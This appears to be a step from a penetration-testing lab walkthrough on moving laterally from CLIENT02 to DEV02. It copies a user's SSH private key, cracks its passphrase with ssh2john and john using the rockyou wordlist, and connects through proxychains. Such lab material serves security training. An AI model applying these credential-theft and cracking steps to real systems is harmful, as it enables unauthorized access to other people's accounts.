# Leaving CLIENT02 / Lateral movement to DEV02

Once you have administrative access on CLIENT02, there is an SSH private key in an user's folder.  
1. Copy the file "C:\Users\nicole.lewis\.ssh\nlewis" onto your Kali VM
2. Convert SSH key to john format: `python ssh2john.py nlewis > hash_nlewis_key.txt`
3. Crack the key: `john --wordlist=rockyou.txt hash_nlewis_key.txt`
4. Connect to DEV02 with the SSH key: `proxychains ssh -i nlewis dev@172.16.X.222`
